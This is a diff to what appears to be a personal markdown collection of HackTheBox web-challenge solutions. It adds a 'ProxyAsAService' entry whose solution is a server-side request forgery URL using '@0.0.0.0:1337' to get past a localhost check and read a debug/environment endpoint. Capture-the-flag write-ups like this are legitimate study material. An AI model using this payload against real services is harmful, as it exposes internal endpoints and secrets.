@@ -86,6 +86,12 @@ Reminder for encoding :
 	Host: localhost:1337
    ```
 - Solution: https://medium.com/@reinhardt.pwn/hackthebox-challenge-write-up-apacheblaze-a32643f19c45
-    
 
-
+**07 ProxyAsAService:**
+- Link: https://app.hackthebox.com/challenges/proxyasaservice
+- Hint: Bypass Local Host IP. Flag Stored in debug/environment
+- Solution:
+   		```
+	 	http://159.65.20.166:32723/?url=@0.0.0.0:1337/debug/environment
+		```
+- Explanation: https://medium.com/@reinhardt.pwn/hackthebox-challenge-write-up-proxyasservice-ed593e9f179b
